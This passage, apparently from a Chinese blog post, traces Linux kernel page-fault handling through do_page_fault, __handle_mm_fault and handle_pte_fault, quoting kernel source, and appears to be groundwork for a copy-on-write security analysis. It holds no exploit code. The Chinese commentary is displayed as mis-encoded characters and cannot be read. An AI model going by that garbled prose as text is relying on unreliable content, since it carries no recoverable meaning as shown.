¸åœ°å€ç©ºé—´å‘ç”Ÿçš„ç¼ºé¡µåˆ™ä½¿ç”¨<code>vmalloc_fault(address)</code>è¿›è¡Œå¤„ç†ã€‚</p><p>éšåè¿˜æ˜¯ä¸»è¦åˆ†æç”¨æˆ·æ€çš„ç¼ºé¡µå¼‚å¸¸ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(error_code &amp; PF_RSVD))</span><br><span class="line">pgtable_bad(regs, error_code, address);</span><br></pre></td></tr></table></figure><p>å¦‚æœä½¿ç”¨äº†é¡µè¡¨é¡¹ä¿ç•™çš„æ ‡è¯†ä½åˆ™ä»£è¡¨æ˜¯é¡µè¡¨é”™è¯¯å¹¶è¿›è¡Œå¤„ç†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(smap_violation(error_code, regs))) &#123;</span><br><span class="line">  bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸€æ­¥åˆ™æ˜¯éªŒè¯æ˜¯å¦å‡ºå‘äº†<code>smap</code>ä¿æŠ¤ï¼Œå¦‚æœæ˜¯åˆ™ç›´æ¥æ€æ­»è¿›ç¨‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(faulthandler_disabled() || !mm)) &#123;</span><br><span class="line">  bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒéªŒè¯äº†æ—¶å€™å¼€å¯äº†ç¼ºé¡µä¸å¤„ç†æˆ–è€…æ˜¯ä¸å­˜åœ¨ç”¨æˆ·ç©ºé—´ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (user_mode(regs)) &#123;</span><br><span class="line">  local_irq_enable();</span><br><span class="line">  error_code |= PF_USER;</span><br><span class="line">  flags |= FAULT_FLAG_USER;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (regs-&gt;flags &amp; X86_EFLAGS_IF)</span><br><span class="line">    local_irq_enable();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­å¯„å­˜å™¨å‘ç”Ÿç¼ºé¡µæ—¶æ˜¯å¦ä¸ºç”¨æˆ·æ€å¯„å­˜å™¨ï¼Œç´§æ¥ç€å‘é€ç»ˆç«¯è¯·æ±‚ï¼Œç„¶åè®¾ç½®<code>error_code</code>å’Œ<code>flags</code>ä¸ºç”¨æˆ·ç©ºé—´å‘ç”Ÿçš„ç¼ºé¡µã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (error_code &amp; PF_WRITE)</span><br><span class="line">  flags |= FAULT_FLAG_WRITE;</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­æ˜¯å¦æ˜¯åœ¨å†™çš„æ—¶å€™å‘ç”Ÿçš„ï¼Œå¦‚æœæ˜¯çš„è¯åˆ™ç»™flagsæ·»åŠ ç›¸åº”çš„æ ‡è¯†ä½ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(!down_read_trylock(&amp;mm-&gt;mmap_sem))) &#123;</span><br><span class="line"><span class="keyword">if</span> ((error_code &amp; PF_USER) == <span class="number">0</span> &amp;&amp; </span><br><span class="line">    !search_exception_tables(regs-&gt;ip)) &#123;</span><br><span class="line">bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">retry:</span><br><span class="line">down_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">might_sleep();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éšåå¯¹<code>mm_struct</code>ä¸Šé”ï¼Œå¦‚æœä¸Šé”å¤±è´¥å¹¶ä¸”å‘ç°æ˜¯å†…æ ¸ç©ºé—´çš„å¼‚å¸¸åˆ™æ€æ­»è¿›ç¨‹ï¼ŒæˆåŠŸåˆ™ç»§ç»­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">vma = find_vma(mm, address);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!vma)) &#123;</span><br><span class="line">  bad_area(regs, error_code, address);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (likely(vma-&gt;vm_start &lt;= address))</span><br><span class="line">  <span class="keyword">goto</span> good_area;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!(vma-&gt;vm_flags &amp; VM_GROWSDOWN))) &#123;</span><br><span class="line">  bad_area(regs, error_code, address);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (error_code &amp; PF_USER) &#123;</span><br><span class="line">  <span class="keyword">if</span> (unlikely(address + <span class="number">65536</span> + <span class="number">32</span> * <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>) &lt; regs-&gt;sp)) &#123;</span><br><span class="line">    bad_area(regs, error_code, address);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (unlikely(expand_stack(vma, address))) &#123;</span><br><span class="line">  bad_area(regs, error_code, address);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œåˆ™æ˜¯æœçº¿æœç´¢åˆ°åœ°å€å¯¹åº”çš„vmaï¼Œå¦‚æœvmaä¸å­˜åœ¨åˆ™æ€æ­»è¿›ç¨‹ã€‚å¦‚æœä½¿ç”¨çš„çº¿æ€§åœ°å€å¤§äº<code>vma-&gt;vm_start</code>åˆ™è¿›å…¥<code>good_area</code>ã€‚å¦‚æœä¸æ˜¯åˆ™è¿›å…¥ä¸‹ä¸€ä¸ªifï¼Œåˆ¤æ–­å½“å‰çš„vmaæ˜¯å¦ä¸ºå †æ ˆåŒºï¼Œå¦‚æœä¸æ˜¯åˆ™ç›´æ¥æ€æ­»è¿›ç¨‹ã€‚ç´§æ¥ç€éªŒè¯æ˜¯å¦ä¸ºç”¨æˆ·ç©ºé—´çš„ç¼ºé¡µï¼Œå¦‚æœæ˜¯åˆ™ç´§æ¥ç€æ˜¯å¯¹æ ˆçš„ä¸€ä¸ªåˆ¤æ–­ã€‚åç»­åˆ™æ˜¯å¢é•¿çº¿æ€§åŒºï¼Œå¦‚æœå¤±è´¥ä¹Ÿæ€æ­»è¿›ç¨‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">good_area:</span><br><span class="line"><span class="keyword">if</span> (unlikely(access_error(error_code, vma))) &#123;</span><br><span class="line">bad_area_access_error(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">fault = handle_mm_fault(mm, vma, address, flags);</span><br><span class="line">major |= fault &amp; VM_FAULT_MAJOR;</span><br></pre></td></tr></table></figure><p>è¿è¡Œåˆ°è¿™é‡Œå…ˆæ˜¯åˆ¤æ–­ä¸€ä¸‹<code>error_code</code>ä¸vmaæ˜¯å¦å†²çªï¼Œå¦‚æœä¸å†²çªåˆ™è¿›å…¥åˆ†é…ç‰©ç†é¡µçš„æ ¸å¿ƒå‡½æ•°<code>handle_mm_fault</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(fault &amp; VM_FAULT_RETRY)) &#123;</span><br><span class="line">  <span class="keyword">if</span> (flags &amp; FAULT_FLAG_ALLOW_RETRY) &#123;</span><br><span class="line">    flags &amp;= ~FAULT_FLAG_ALLOW_RETRY;</span><br><span class="line">    flags |= FAULT_FLAG_TRIED;</span><br><span class="line">    <span class="keyword">if</span> (!fatal_signal_pending(tsk))</span><br><span class="line">      <span class="keyword">goto</span> retry;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (flags &amp; FAULT_FLAG_USER)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  no_context(regs, error_code, address, SIGBUS, BUS_ADRERR);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆ¤æ–­æ˜¯å¦éœ€è¦å……å®ï¼Œå¦‚æœéœ€è¦é‡è¯•ï¼Œé‚£ä¹ˆè¿›ä¸€æ­¥åˆ¤æ–­åœ¨å¼€å§‹åˆå§‹åŒ–çš„flagsä¸­æ˜¯å¦åŒ…å«æ ‡å¿—ä½<code>FAULT_FLAG_ALLOW_RETRY</code>ï¼Œå¦‚æœæœ‰çš„è¯åˆ™è¿›è¡Œå……å®ï¼Œå¹¶ä¸”æ“¦å‡ºæ‰flagsä¸­çš„å…è®¸å……å®æ ‡è¯†ä¸ºï¼Œå¹¶ä¸”æ·»åŠ <code>FAULT_FLAG_TRIED</code>æ ‡å¿—ä½ã€‚</p><h4 id="handle-mm-fault"><a href="#handle-mm-fault" class="headerlink" title="handle_mm_fault"></a><strong>handle_mm_fault</strong></h4><p>è¿™ä¸ªå‡½æ•°çš„ä¸­çš„çœŸæ­£å¤„ç†å‡½æ•°å…¶å®æ˜¯<code>__handle_mm_fault</code>ï¼Œæ‰€ä»¥ç›´æ¥çœ‹å…¶ä¸­çš„è¿™ä¸ªå‡½æ•°å§ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __handle_mm_fault(struct mm_struct *mm, struct vm_area_struct *vma,</span><br><span class="line">     <span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">pgd_t</span> *pgd;</span><br><span class="line"><span class="keyword">pud_t</span> *pud;</span><br><span class="line"><span class="keyword">pmd_t</span> *pmd;</span><br><span class="line"><span class="keyword">pte_t</span> *pte;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(is_vm_hugetlb_page(vma)))</span><br><span class="line"><span class="keyword">return</span> hugetlb_fault(mm, vma, address, flags);</span><br><span class="line"></span><br><span class="line">pgd = pgd_offset(mm, address);</span><br><span class="line">pud = pud_alloc(mm, pgd, address);</span><br><span class="line"><span class="keyword">if</span> (!pud)</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line">pmd = pmd_alloc(mm, pud, address);</span><br><span class="line"><span class="keyword">if</span> (!pmd)</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line"><span class="keyword">if</span> (pmd_none(*pmd) &amp;&amp; transparent_hugepage_enabled(vma)) &#123;</span><br><span class="line"><span class="keyword">int</span> ret = create_huge_pmd(mm, vma, address, pmd, flags);</span><br><span class="line"><span class="keyword">if</span> (!(ret &amp; VM_FAULT_FALLBACK))</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">pmd_t</span> orig_pmd = *pmd;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">barrier();</span><br><span class="line"><span class="keyword">if</span> (pmd_trans_huge(orig_pmd)) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> dirty = flags &amp; FAULT_FLAG_WRITE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If the pmd is splitting, return and retry the</span></span><br><span class="line"><span class="comment"> * the fault.  Alternative: wait until the split</span></span><br><span class="line"><span class="comment"> * is done, and goto retry.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (pmd_trans_splitting(orig_pmd))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pmd_protnone(orig_pmd))</span><br><span class="line"><span class="keyword">return</span> do_huge_pmd_numa_page(mm, vma, address,</span><br><span class="line">     orig_pmd, pmd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dirty &amp;&amp; !pmd_write(orig_pmd)) &#123;</span><br><span class="line">ret = wp_huge_pmd(mm, vma, address, pmd,</span><br><span class="line">orig_pmd, flags);</span><br><span class="line"><span class="keyword">if</span> (!(ret &amp; VM_FAULT_FALLBACK))</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">huge_pmd_set_accessed(mm, vma, address, pmd,</span><br><span class="line">      orig_pmd, dirty);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Use __pte_alloc instead of pte_alloc_map, because we can&#x27;t</span></span><br><span class="line"><span class="comment"> * run pte_offset_map on the pmd, if an huge pmd could</span></span><br><span class="line"><span class="comment"> * materialize from under us from a different thread.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(pmd_none(*pmd)) &amp;&amp;</span><br><span class="line">    unlikely(__pte_alloc(mm, vma, pmd, address)))</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line"><span class="comment">/* if an huge pmd materialized from under us just retry later */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(pmd_trans_huge(*pmd)))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * A regular pmd is established and it can&#x27;t morph into a huge pmd</span></span><br><span class="line"><span class="comment"> * from under us anymore at this point because we hold the mmap_sem</span></span><br><span class="line"><span class="comment"> * read mode and khugepaged takes it in write mode. So now it&#x27;s</span></span><br><span class="line"><span class="comment"> * safe to run pte_offset_map().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">pte = pte_offset_map(pmd, address);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> handle_pte_fault(mm, vma, address, pte, pmd, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›¸ä¿¡çœ‹è¿‡æˆ‘å‰é¢é‚£ç¯‡æ–‡ç« çš„éƒ½ä¸ä¼šé™Œç”Ÿ<code>pgd | pud | pmd | pte</code>è¿™å››ä¸ªé¡µè¡¨ï¼Œä»–ä»¬åˆ†è¡¨è¡¨ç¤ºçš„æ˜¯<code>é¡µå…¨å±€ç›®å½•ï½œé¡µä¸Šçº§ç›®å½•ï½œé¡µä¸­é—´ç›®å½•ï½œé¡µè¡¨é¡¹</code>ï¼Œè¿™ä¸ªå‡½æ•°ä¸­é¦–å…ˆåˆ™æ˜¯é€šè¿‡mmè·å–åˆ°pgdé¡µå…¨å±€ç›®å½•ï¼Œéšåç”Ÿæˆpudå’Œpmdå¹¶ä¸ºpmdåˆ›å»ºä¸­é—´é¡¹ï¼Œåœ¨æœ€åè´§æ¸ é“pteå¹¶è¿›å…¥åˆ°å¤„ç†å‡½æ•°<code>handle_pte_fault</code>ä¸­ã€‚</p><h4 id="handle-pte-fault"><a href="#handle-pte-fault" class="headerlink" title="handle_pte_fault"></a><strong>handle_pte_fault</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">handle_pte_fault</span><span class="params">(struct mm_struct *mm,</span></span></span><br><span class="line"><span class="params"><span class="function">     struct vm_area_struct *vma, <span class="keyword">unsigned</span> <span class="keyword">long</span> address,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">pte_t</span> *pte, <span class="keyword">pmd_t</span> *pmd, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pte_t</span> entry;</span><br><span class="line"><span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * some architectures can have larger ptes than wordsize,</span></span><br><span class="line"><span class="comment"> * e.g.ppc44x-defconfig has CONFIG_PTE_64BIT=y and CONFIG_32BIT=y,</span></span><br><span class="line"><span class="comment"> * so READ_ONCE or ACCESS_ONCE cannot guarantee atomic accesses.</span></span><br><span class="line"><span class="comment"> * The code below just needs a consistent view for the ifs and</span></span><br><span class="line"><span class="comment"> * we later double check anyway with the ptl lock held. So here</span></span><br><span class="line"><span class="comment"> * a barrier will do.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">entry = *pte;</span><br><span class="line">barrier();</span><br><span class="line"><span class="keyword">if</span> (!pte_present(entry)) &#123;</span><br><span class="line"><span class="keyword">if</span> (pte_none(entry)) &#123;</span><br><span class="line"><span class="keyword">if</span> (vma_is_anonymous(vma))</span><br><span class="line"><span class="keyword">return</span> do_anonymous_page(mm, vma, address,</span><br><span class="line"> pte, pmd, flags);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> do_fault(mm, vma, address, pte, pmd,</span><br><span class="line">flags, entry);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> do_swap_page(mm, vma, address,</span><br><span class="line">pte, pmd, flags, entry);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pte_protnone(entry))</span><br><span class="line"><span class="keyword">return</span> do_numa_page(mm, vma, address, entry, pte, pmd);</span><br><span class="line"></span><br><span class="line">ptl = pte_lockptr(mm, pmd);</span><br><span class="line">spin_lock(ptl);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!pte_same(*pte, entry)))</span><br><span class="line"><span class="keyword">goto</span> unlock;</span><br><span class="line"><span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) &#123;</span><br><span class="line"><span class="keyword">if</span> (!pte_write(entry))</span><br><span class="line"><span class="keyword">return</span> do_wp_page(mm, vma, address,</span><br><span class="line">pte, pmd, ptl, entry);</span><br><span class="line">entry = pte_mkdirty(entry);</span><br><span class="line">&#125;</span><br><span class="line">entry = pte_mkyoung(entry);</span><br><span class="line"><span class="keyword">if</span> (ptep_set_access_flags(vma, address, pte, entry, flags &amp; FAULT_FLAG_WRITE)) &#123;</span><br><span class="line">update_mmu_cache(vma, address, pte);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is needed only for protection faults but the arch code</span></span><br><span class="line"><span class="comment"> * is not yet telling us if this is a protection fault or not.</span></span><br><span class="line"><span class="comment"> * This still avoids useless tlb flushes for .text page faults</span></span><br><span class="line"><span class="comment"> * with threads.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE)</span><br><span class="line">flush_tlb_fix_spurious_fault(vma, address);</span><br><span class="line">&#125;</span><br><span class="line">unlock:</span><br><span class="line">pte_unmap_unlock(pte, ptl);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡½æ•°å¼€å¤´åˆå§‹åŒ–<code>entry</code>ä¸ºpteçš„å†…å­˜é¡µç„¶åæˆ‘ä»¬ç»§ç»­é€è¡Œåˆ†æã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!pte_present(entry)) &#123;</span><br><span class="line">  <span class="keyword">if</span> (pte_none(entry)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (vma_is_anonymous(vma))</span><br><span class="line">      <span class="keyword">return</span> do_anonymous_page(mm, vma, address,</span><br><span class="line">                               pte, pmd, flags);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> do_fault(mm, vma, address, pte, pmd,</span><br><span class="line">                      flags, entry);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> do_swap_page(mm, vma, address,</span><br><span class="line">                      pte, pmd, flags, entry);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆåˆ¤æ–­é¡µè¡¨æ˜¯å¦å­˜åœ¨äºä¸»å­˜ä¸­ï¼Œæ¥ç€åˆ¤æ–­æ˜¯å¦ä¸ºnoneï¼Œå¦‚æœä¸ºç©ºåˆ™è¡¨ç¤ºç¬¬ä¸€æ¬¡è®¿é—®è¯¥é¡µï¼Œé‚£ä¹ˆç»§ç»­è¿›å…¥åˆ¤æ–­vmaæ˜¯å¦ä¸ºåŒ¿ååŒºï¼Œå¦‚æœä¸æ˜¯åˆ™æ‰§è¡Œ<code>do_fault</code>è¿”å›ç‰©ç†é¡µã€‚å¦‚æœè¯¥é¡µä¸ä¸ºç©ºï¼Œè½¯æ€§ç¼ºé¡µå¼‚å¸¸ä¸­çš„ç¬¬äºŒç§æƒ…å†µï¼Œä»£è¡¨è¯¥é¡µä»¥å‰å­˜åœ¨äºä¸»å­˜ä¸­ä½†æ˜¯è¢«è°ƒå‡ºäº†ã€‚</p><p>ç¨‹åºç»§ç»­å¾€åæ‰§è¡Œï¼Œä¸‹æ–¹ä»£è¡¨çš„æ˜¯å†…å­˜é¡µå­˜åœ¨äºä¸»å­˜ä¸­æ—¶çš„æƒ…å†µã€‚</p><p>é¦–å…ˆåˆ™æ˜¯å…ˆåŠ äº†ä¸€å±‚é”<code>spin_lock(ptl);</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!pte_write(entry))</span><br><span class="line">    <span class="keyword">return</span> do_wp_page(mm, vma, address,</span><br><span class="line">                      pte, pmd, ptl, entry);</span><br><span class="line">  entry = pte_mkdirty(entry);</span><br><span class="line">&#125;</span><br><span class="line">entry = pte_mkyoung(entry);</span><br></pre></td></tr></table></figure><p>é¦–å…ˆé€šè¿‡flagsåˆ¤æ–­æ˜¯å¦æ˜¯åº”ä¸ºå†™æ“ä½œå¼•èµ·çš„ç¼ºé¡µå¼‚å¸¸ï¼Œç´§æ¥ç€çœ‹å¯¹åº”çš„é¡µæ˜¯å¦å¯å†™ï¼Œå¦‚æœä¸å¯å†™åˆ™è¿›å…¥<code>do_wp_page</code>å‡½æ•°ä¸­ã€‚åç»­å°±æ˜¯å°†è¯¥é¡µæ ‡è„å’Œæ ‡ä¸Šå·²ç»è®¿é—®è¿‡ã€‚</p><p>ç»è¿‡ä¸Šè¿°æµç¨‹ä¸éš¾å‘ç°å½“ä¸€ä¸ªè¿›ç¨‹é¦–æ¬¡è®¿é—®ä¸€ä¸ªä¸å¯å†™çš„å†…å­˜é¡µæ—¶ä¼šè§¦å‘ä¸¤æ¬¡ç¼ºé¡µå¼‚å¸¸ï¼Œä¸€æ¬¡æ˜¯é¡µä¸å­˜åœ¨äºä¸»å­˜ä¸­çš„æƒ…å†µï¼Œç¬¬äºŒæ¬¡æ˜¯ä¸‹é¢å­˜åœ¨äºä¸»å­˜çš„æƒ…å†µã€‚</p><p>é‚£ä¹ˆé¦–å…ˆæˆ‘ä»¬å…ˆçœ‹ç¬¬ä¸€æ¬¡è¿›å…¥çš„æƒ…å†µï¼Œæ­¤æ—¶å¤„ç†çš„å‡½æ•°ä¸º<code>do_fault</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span 